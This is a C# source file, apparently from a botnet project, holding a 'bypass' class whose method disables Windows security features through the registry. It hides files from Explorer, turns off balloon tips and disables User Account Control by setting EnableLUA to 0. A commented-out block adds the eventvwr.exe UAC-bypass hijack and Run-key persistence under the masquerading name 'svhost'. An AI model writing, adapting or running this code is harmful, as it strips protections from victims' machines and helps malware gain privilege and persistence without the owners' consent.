using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Text;

namespace BotNet.Services.Protect
{
    public static class bypass
    {
        public static void DisableProcedures()
        {
            try
            {
                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("Hidden", "2", RegistryValueKind.DWord);
            }
            catch { }

            if (BotNet.Configure.DisableUAC)
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true).SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
                }
                catch { }

                try
                {
                    Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                }
                catch { }
            }
            //try
            //{
            //    string escpath = Assembly.GetEntryAssembly().Location;
            //    Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command").SetValue("", escpath);
            //    Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue("svhost", escpath);
            //    //Process.Start("eventvwr.exe");
            //    //Environment.Exit(0);
            //}
            //catch //(Exception ex)
            //{
            //    //Console.WriteLine(ex.ToString());
            //}
        }
    }
}
